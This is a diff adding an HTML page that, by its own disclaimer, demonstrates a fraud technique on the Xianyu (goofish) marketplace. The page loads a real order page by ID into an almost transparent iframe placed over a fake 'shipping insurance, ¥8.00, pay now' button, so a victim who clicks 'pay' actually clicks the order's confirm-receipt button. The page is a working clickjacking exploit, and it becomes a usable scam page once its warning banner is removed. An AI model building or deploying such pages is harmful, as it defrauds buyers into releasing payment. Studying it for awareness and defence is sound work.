@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>运费保价</title>
+  <style>
+    body {
+      margin: 0;
+    }
+    .tip {
+      position: absolute;
+      z-index: 9;
+      padding: 25px;
+      text-align: center;
+      font-size: 14px;
+      background-color: #eee;
+    }
+    .tip .title {
+      color: red;
+      font-size: 20px;
+    }
+    .tip .section {
+      padding: 6px;
+      border: 1px solid #d4d4d4;
+      margin: 6px auto;
+    }
+    #range {
+      width: 90%;
+    }
+    .frame {
+      position: absolute;
+      z-index: 5;
+      opacity: 0.1;
+      width: 100%;
+      height: 100%;
+    }
+    .fake {
+      position: absolute;
+      z-index: 1;
+      bottom: 0;
+      width: 100%;
+      padding: 2.13333vw 4.26667vw;
+      display: flex;
+      flex-direction: row;
+      box-sizing: border-box;
+    }
+    .fake > span {
+      flex-grow: 1;
+      flex-shrink: 1;
+      font-size: 3.5vw;
+    }
+    .fake .price {
+      color: red;
+      font-size: 5.5vw;
+    }
+    .fake .button {
+      width: 40vw;
+      border: none;
+      height: 10.66667vw;
+      line-height: 10.66667vw;
+      text-align: center;
+      font-family: PingFangSC-Regular;
+      font-size: 4.26667vw;
+      color: #333;
+      border-radius: 5.33333vw;
+      background-image: -webkit-gradient(linear,left top,right bottom,from(#fff133),to(#ffe60f));
+      background-image: -moz-linear-gradient(top left,#fff133,#ffe60f);
+      background-image: linear-gradient(to bottom right,#fff133,#ffe60f);
+    }
+  </style>
+</head>
+<body>
+  <div class="tip">
+    <div class="title">这是一个演示页面，用于复现某鱼的一个诈骗手段。请勿用于非法用途，此页面产生的任何后果，作者概不负责。</div>
+    <div class="section">
+      <div>使用说明：自己下一个订单，然后将订单号填到下面的输入框中，点击“确定”，然后可以自行拖动透明度查看效果。</div>
+      <div>原理解释：利用网页层叠关系，将某鱼的订单页面以100%透明度叠在了你看到的网页上面。但你真实点击“支付”时，实际上点击的是某鱼的确认收货按钮。</div>
+    </div>
+    <div class="section">
+      <div>拖动这里调节页面不透明度</div>
+      <div><input type="range" id="range" min="0" max="100" value="10"></div>
+    </div>
+    <div class="section">
+      <div>输入某鱼订单ID</div>
+      <div><input type="text" id="order"><button id="submit">确定</button></div>
+    </div>
+  </div>
+  <iframe id="frame" class="frame"></iframe>
+  <div class="fake">
+    <span>实际运费：<span class="price">￥8.00</span></span>
+    <button class="button">立即支付</button>
+  </div>
+  <script>
+    document.getElementById('submit').addEventListener('click', () => {
+      const orderId = document.getElementById('order').value;
+      document.getElementById('frame').src = 'https://h5.m.goofish.com/app/idleFish-F2e/fish-c2c-order/order.html?orderId=' + orderId;
+    });
+    document.getElementById('range').addEventListener('input', () => {
+      requestAnimationFrame(() => {
+        document.getElementById('frame').style.opacity = document.getElementById('range').value / 100;
+      });
+    });
+    alert('这是一个演示页面，用于复现某鱼的一个诈骗手段。请勿用于非法用途，此页面产生的任何后果，作者概不负责');
+  </script>
+</body>
+</html>
